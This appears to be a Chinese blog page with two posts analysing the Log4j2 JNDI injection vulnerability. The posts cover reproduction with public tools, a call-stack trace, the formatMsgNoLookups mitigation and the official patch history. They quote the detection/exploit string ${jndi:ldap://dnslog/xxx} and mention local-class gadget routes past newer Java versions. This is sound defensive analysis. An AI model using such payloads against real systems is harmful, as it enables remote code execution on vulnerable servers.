<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="自动笔记生成器">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="自动笔记生成器">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="0xSky">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://yoursite.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>自动笔记生成器</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">自动笔记生成器</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/12/15/log4j2%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%B0%8F%E8%AE%A1-ZCY%E6%8A%95%E7%A8%BF%E7%89%88/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="0xSky">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="自动笔记生成器">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/12/15/log4j2%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%B0%8F%E8%AE%A1-ZCY%E6%8A%95%E7%A8%BF%E7%89%88/" class="post-title-link" itemprop="url">log4j2漏洞简单小计_ZCY投稿版</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-12-15 16:11:04 / 修改时间：16:17:03" itemprop="dateCreated datePublished" datetime="2021-12-15T16:11:04+08:00">2021-12-15</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>log4j2核弹级漏洞最近被公开了，log4j2作为log4j的替代者，有着非常广泛的使用，因为几乎没有条件的限制漏洞公开带来的影响极大，许许多多技术员也是因此一夜无眠。</p>
<h4 id="影响求证"><a href="#影响求证" class="headerlink" title="影响求证"></a>影响求证</h4><p>在漏洞公开的伊始，许多通告都提到只要存在log4j-api、log4j-core就会被影响，看了下spring boot默认会引入spring boot logging而其中包含log4j的依赖包，那spring不是默认受影响？但是spring boot实际上默认使用logback进行日志实现，slf4j进行抽象层管理，所以只看依赖判断是否受影响有些不严谨，许多通告方都没有仔细求证，这里用测试项目来试一下。</p>
<p>写一个会将输入写入日志的接口。</p>
<p><img src="/images/211215/Image%20.png" alt=""></p>
<p><img src="/images/211215/Image%20%5B1%5D.png" alt=""></p>
<p>访问一下，日志写入。</p>
<p><img src="/images/211215/Image%20%5B2%5D.png" alt=""></p>
<p>接下来下断点看是什么日志组件进行了处理，可以看到是logback对日志进行了处理。</p>
<p><img src="/images/211215/Image%20%5B3%5D.png" alt=""></p>
<p>所以网上引入依赖就算被影响的叙述实际上是不准确、不严谨的，虽然这有助于引起注意但是也对排查造成了干扰，并不可取。log4j和logback会被spring boot logging组件默认引入，但spring默认会使用logback，所以spring boot默认引入了log4j但并不受影响。<br>作为技术从业者应该谨记不要听风就是雨。对于漏洞应小心求证，细心排查，严谨处理。<br>当然这个漏洞的邮箱还是非常巨大的，因为有许多的组件都用到了它，例如es、Struts2、Solr等等众多组件与服务。<br>再补上一个受影响的log4j进行日志记录，手动使用log4j处理日志，这样就由log4j进行日志处理了。</p>
<p><img src="/images/211215/Image%20%5B4%5D.png" alt=""></p>
<p><img src="/images/211215/Image%20%5B5%5D.png" alt=""></p>
<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>网络上流传最广的是使用JNDI进行LDAP DNS查询来确定是否受漏洞影响的exp（${jndi:ldap://dnslog/xxx}），根据这个exp我们可以简单判定是因为JNDI LDAP查询远程class并进行加载造成的攻击。这个漏洞实际上是官方支持的一种功能，官方支持在日志设置时使用${xxx}进行动态设置（<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html" target="_blank" rel="noopener">官网描述</a>），并且支持日志输出时使用如log.info(“${sys:java.version})动态获取并输出一些内容，而后面这个功能也支持JNDI协议，所以暴露在了JDNI注入攻击（JDNI远程类加载攻击）之中。</p>
<p>这里简单介绍一下这种攻击，JNDI全称为Java Naming and Directory Interface，是一种类似于索引中心的API功能，可以用于实现动态配置的功能。当代码中jndiName变量可控时，发起查询的客户端就会从服务端加载远程class文件，最终导致命令执行。<br>在上述的POC中使用的是JNDI LDAP注入攻击，其攻击过程为：攻击者发送恶意JNDI  LDAP查询——被攻击服务接受并发起查询——从攻击者部署的JDNI上下载class——本地加载class——触发class中预置的恶意代码<br>Java官方对这个问题进行过修复，在Java 1.8_191起默认不信任远程codebase，即远程class文件不会被自动加载，所以在Java 1.8_191及以后只能从本地class文件加载。<br>更多的详情在<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf" target="_blank" rel="noopener">blackhat议题</a>中有更加详细的描述。</p>
<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>只是简单复现问题的话可以使用低版本java环境来测试，这里我使用过低于Java 1.8_191的版本测试。</p>
<p>最初使用JNDI-Injection-Exploit与marshalsec（这两款测试工具都有LDAP服务功能，可以在全球最大同性交友平台找到）生成弹出POC测试没有成功，简单跟了下代码断点发现我直接使用springboot后只引入了log4j-api组件，实际日志在slf4j处理后被logback实际输出了，并没有使用log4j。这里也侧面说明了有log4j-api就被影响的说法也是不准确的，必须要有log4j-core依赖因为触发漏洞的代码实际在这个组件包中，在排查受影响服务时也应该以log4j-core依赖为准，下文中会有体现。<br>继续测试，先排除原有的spring-boot-starter-logging依赖，测试项目是在spring-boot-starter-web组件的spring-boot-starter依赖组件中引入了logging，所以要此组件引入处的pom配置处排除spring-boot-starter-logging。<br>之后直接按照IDE的提示引入log4j-api，这时进行测试会报错，提示我们需要引入log4j-core。</p>
<p><img src="/images/211215/Image%20%5B6%5D.png" alt=""></p>
<p>引入包后再执行日志记录动作，触发了ldap查询动作，弹出计算器。</p>
<p><img src="/images/211215/Image%20%5B7%5D.png" alt=""></p>
<p><img src="/images/211215/Image%20%5B8%5D.png" alt=""></p>
<p><img src="/images/211215/Image%20%5B9%5D.png" alt=""></p>
<h4 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h4><p>按照惯例先贴一下调用栈</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">c_lookup:<span class="number">1017</span>, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:<span class="number">542</span>, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">177</span>, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">94</span>, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">lookup:<span class="number">172</span>, JndiManager (org.apache.logging.log4j.core.net)</span><br><span class="line">lookup:<span class="number">56</span>, JndiLookup (org.apache.logging.log4j.core.lookup)</span><br><span class="line">lookup:<span class="number">223</span>, Interpolator (org.apache.logging.log4j.core.lookup)</span><br><span class="line">resolveVariable:<span class="number">1116</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">1038</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">912</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">replace:<span class="number">467</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">format:<span class="number">132</span>, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">format:<span class="number">38</span>, PatternFormatter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">toSerializable:<span class="number">345</span>, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)</span><br><span class="line">toText:<span class="number">244</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">229</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">59</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">directEncodeEvent:<span class="number">197</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryAppend:<span class="number">190</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">append:<span class="number">181</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryCallAppender:<span class="number">156</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender0:<span class="number">129</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenderPreventRecursion:<span class="number">120</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender:<span class="number">84</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenders:<span class="number">543</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">processLogEvent:<span class="number">502</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">485</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">460</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">82</span>, AwaitCompletionReliabilityStrategy (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">161</span>, Logger (org.apache.logging.log4j.core)</span><br><span class="line">tryLogMessage:<span class="number">2198</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageTrackRecursion:<span class="number">2152</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageSafely:<span class="number">2135</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessage:<span class="number">2011</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logIfEnabled:<span class="number">1983</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">error:<span class="number">740</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logTest:<span class="number">13</span>, LogTest (com.examplespring.demo.controller)</span><br><span class="line">LogTest:<span class="number">14</span>, TestController (com.examplespring.demo.controller)</span><br></pre></td></tr></table></figure>

<p>在调用栈里我们可以看到关键的几个动作：<br>lookup:172, JndiManager (<a href="http://org.apache.logging.log4j.core.net/" target="_blank" rel="noopener">org.apache.logging.log4j.core.net</a>)<br>lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup)<br>lookup:223, Interpolator (org.apache.logging.log4j.core.lookup)<br>resolveVariable:1116, StrSubstitutor (org.apache.logging.log4j.core.lookup)<br>substitute:1038, StrSubstitutor (org.apache.logging.log4j.core.lookup)<br>substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)<br>replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)<br>format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)<br>format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)<br>这几个动作都在log4j-core组件包中，也印证了前面说的有log4j-api就有问题是不准确的，实际上修复漏洞首要需要关注log4j-core包。</p>
<p>从toText这个函数开始跟进，这里开始转化event内容进行输出。</p>
<p><img src="/images/211215/Image%20%5B10%5D.png" alt=""></p>
<p> toSerializable函数遍历使用PatternFormatter对event进行格式化。</p>
<p><img src="/images/211215/Image%20%5B11%5D.png" alt=""></p>
<p>在第15个PatternFormatter——MessagePatternConverter进行操作时，event中如果有${就会进行替换。</p>
<p><img src="/images/211215/Image%20%5B12%5D.png" alt=""></p>
<p>这里打个岔，可以看到进入替换逻辑有noLookups为false的前提，所以这里就有了临时修复方案——将这个变量设置为true，而这个变量就是<em>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS</em>常量，来源于从配置中查找log4j2.formatMsgNoLookups的值，如果不配置则其默认值为false。</p>
<p><img src="/images/211215/Image%20%5B13%5D.png" alt=""></p>
<p><img src="/images/211215/Image%20%5B14%5D.png" alt=""></p>
<p>言归正传，后续调用substitute递归解析文本中的变量值，注释中也有说明。</p>
<p><img src="/images/211215/Image%20%5B15%5D.png" alt=""></p>
<p>resolveVariable进行具体的变量解析，后续就是lookup调用，最终调用java的lookup，所以也受java环境限制。</p>
<p><img src="/images/211215/Image%20%5B16%5D.png" alt=""></p>
<p><img src="/images/211215/Image%20%5B17%5D.png" alt=""></p>
<p>上述的操作在java1.8_191前因为默认信任外部codebase是可以进行的，在java1.8_191后不再信任外部codebase所以使用外部类不再可行，许多的通告中都提到了这一点。但是本地存在的类还是可以利用的，而spring boot 默认带有tomcat-embed依赖（实际是依赖EL表达式包）可以通过这种类似的本地类执行代码，还是比较容易利用的，可以参考<a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">Exploiting JNDI Injections in Java</a>和<a href="https://skysliently.github.io/2021/03/23/dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88CVE-2020-1948%EF%BC%89%E5%8F%AF%E7%94%A8%E9%93%BE%E8%B7%AF%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">dubbo反序列化（CVE-2020-1948）可用链路学习</a>一文。</p>
<h4 id="临时措施"><a href="#临时措施" class="headerlink" title="临时措施"></a>临时措施</h4><p>根据前文内容我们可以简单得出一些临时解决方式</p>
<p>设置 jvm 启动参数 “-Dlog4j2.formatMsgNoLookups=true”（先升级到2.10+）<br>在添加额外的log4j2.component.properties配置文件，增加“log4j2.formatMsgNoLookups=True”配置（同上）</p>
<p>使用临时方案后可以在应用启动后打印org.apache.logging.log4j.core.util.Constants.<em>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS</em>参数，是true就关闭了lookup功能。<br>高版本的java环境也能增加利用难度，但不能作为临时修复方案！</p>
<p>顺便吐槽一下网上的修复方案一开始都没说到底在哪里加“log4j2.formatMsgNoLookups=True”配置，我设置了application.properties和log4j2.properties都没有效果，最后在代码里面找到是log4j2.component.properties配置文件。</p>
<p><img src="/images/211215/Image%20%5B18%5D.png" alt=""></p>
<h4 id="官方修复"><a href="#官方修复" class="headerlink" title="官方修复"></a>官方修复</h4><p>官方在漏洞公开前发布了<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1" target="_blank" rel="noopener">log4j-2.15.0-rc1</a>预览版对此问题进行了修复，然而很快就爆出可以利用路径空格报错跳过处理流程直接触发lookup查询，而后官方又发布了<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2" target="_blank" rel="noopener">log4j-2.15.0-rc2</a>修复这个问题，并以<a href="https://github.com/apache/logging-log4j2/releases/tag/rel%2F2.15.0" target="_blank" rel="noopener">rel/2.15.0</a>发布正式版。<br>但此事并未告一段落，在后续几天中官方又发布了<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.1-rc1" target="_blank" rel="noopener">log4j-2.15.1-rc1</a>预览版，默认关闭JDNI。</p>
<p><img src="/images/211215/Image%20%5B19%5D.png" alt=""></p>
<p>接下来在<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.16.0-rc1" target="_blank" rel="noopener">log4j-2.16.0-rc1</a>中又直接去掉了Message的lookup查询功能。</p>
<p><img src="/images/211215/Image%20%5B20%5D.png" alt=""></p>
<p><img src="/images/211215/Image%20%5B21%5D.png" alt=""></p>
<p><img src="/images/211215/Image%20%5B22%5D.png" alt=""></p>
<p>截止到纂稿时，<a href="https://github.com/apache/logging-log4j2/releases/tag/rel%2F2.16.0" target="_blank" rel="noopener">rel/2.16.0</a>正式版已经发布，Message的lookup功能已经被去除。</p>
<h4 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h4><p>随着2.16.0正式版发布，漏洞的官方修复工作应该是告一段落了，但是技术猿们的工作远未结束。自己的项目依赖可以直接修改，但许多组件的依赖更新还需要相应的组件官方团队对其进行更新测试并发布安全版本，漏洞修复之路远未结束，在依赖库中的旧版本没有被完全消灭之前，防御设备的告警依然紧扣技术猿们的心弦，让人宛如惊弓之鸟。</p>
<p>谨以此文祭奠广大技术猿逝去与未逝去的烦恼丝:)。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/12/10/log4j2%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%B0%8F%E8%AE%A1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="0xSky">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="自动笔记生成器">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/12/10/log4j2%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%B0%8F%E8%AE%A1/" class="post-title-link" itemprop="url">log4j2漏洞简单小计</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-12-10 18:39:46 / 修改时间：19:06:24" itemprop="dateCreated datePublished" datetime="2021-12-10T18:39:46+08:00">2021-12-10</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>log4j核弹级漏洞最近被公开了，看了下spring默认会引入log4j的依赖包，许多提高都说只要存在log4j-api、log4j-core就会被影响，那spring岂不是默认受影响，但是spring实际默认使用logback进行日志实现，slf4j进行抽象层管理，所以只看依赖判断是否受影响有些不严谨，这里用测试项目来试一下。</p>
<p>写一个会将输入写入日志的接口。</p>
<p><img src="/images/211210/Image%20.png" alt=""></p>
<p><img src="/images/211210/Image%20%5B1%5D.png" alt=""></p>
<p>访问一下，日志写入。</p>
<p><img src="/images/211210/Image%20%5B2%5D.png" alt=""></p>
<p>接下来下断点看是什么日志组件进行了处理，可以看到是logback对日志进行了处理。</p>
<p><img src="/images/211210/Image%20%5B3%5D.png" alt=""></p>
<p>所以网上引入依赖就算被影响实际上是不准确的描述，log4j和logback会被spring boot log组件默认引入，但spring默认会使用logback。不要听风就是雨。<br>再补上一个受影响的log4j进行日志记录，这里就由log4j进行日志处理了。</p>
<p><img src="/images/211210/Image%20%5B4%5D.png" alt=""></p>
<p><img src="/images/211210/Image%20%5B5%5D.png" alt=""></p>
<p>只是简单复现问题的话可以使用低版本java环境来测试，我使用JNDI-Injection-Exploit生成POC验证了下没有成功，又尝试用marshalsec生成，也没有成功。<br>简单跟了下代码断点发现我直接使用springboot后只引入了log4j-api组件，实际日志在slf4j抽象后被logback实际输出了，闹了个乌龙。所以先排除原有的spring-boot-starter-logging依赖，测试项目是在spring-boot-starter-web组件的spring-boot-starter依赖组件这种引入了logging，所以要此组件引入处排除spring-boot-starter-logging。<br>之后直接按照IDE的提示引入log4j-api，这时进行测试会报错，提示我们需要引入log4j-core，所以有log4j-api就被影响的说法也是不准确的，必须要有log4j-core因为触发漏洞的代码实际在这个组件包中。</p>
<p><img src="/images/211210/Image%20%5B6%5D.png" alt=""></p>
<p>引入包后再执行日志记录动作，触发了ldap查询动作，弹出计算器。</p>
<p><img src="/images/211210/Image%20%5B7%5D.png" alt=""></p>
<p><img src="/images/211210/Image%20%5B8%5D.png" alt=""></p>
<p><img src="/images/211210/Image%20%5B9%5D.png" alt=""></p>
<h4 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h4><p>按照惯例贴一下调用栈</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">c_lookup:<span class="number">1017</span>, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:<span class="number">542</span>, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">177</span>, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">94</span>, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">lookup:<span class="number">172</span>, JndiManager (org.apache.logging.log4j.core.net)</span><br><span class="line">lookup:<span class="number">56</span>, JndiLookup (org.apache.logging.log4j.core.lookup)</span><br><span class="line">lookup:<span class="number">223</span>, Interpolator (org.apache.logging.log4j.core.lookup)</span><br><span class="line">resolveVariable:<span class="number">1116</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">1038</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">912</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">replace:<span class="number">467</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">format:<span class="number">132</span>, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">format:<span class="number">38</span>, PatternFormatter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">toSerializable:<span class="number">345</span>, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)</span><br><span class="line">toText:<span class="number">244</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">229</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">59</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">directEncodeEvent:<span class="number">197</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryAppend:<span class="number">190</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">append:<span class="number">181</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryCallAppender:<span class="number">156</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender0:<span class="number">129</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenderPreventRecursion:<span class="number">120</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender:<span class="number">84</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenders:<span class="number">543</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">processLogEvent:<span class="number">502</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">485</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">460</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">82</span>, AwaitCompletionReliabilityStrategy (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">161</span>, Logger (org.apache.logging.log4j.core)</span><br><span class="line">tryLogMessage:<span class="number">2198</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageTrackRecursion:<span class="number">2152</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageSafely:<span class="number">2135</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessage:<span class="number">2011</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logIfEnabled:<span class="number">1983</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">error:<span class="number">740</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logTest:<span class="number">13</span>, LogTest (com.examplespring.demo.controller)</span><br><span class="line">LogTest:<span class="number">14</span>, TestController (com.examplespring.demo.controller)</span><br></pre></td></tr></table></figure>

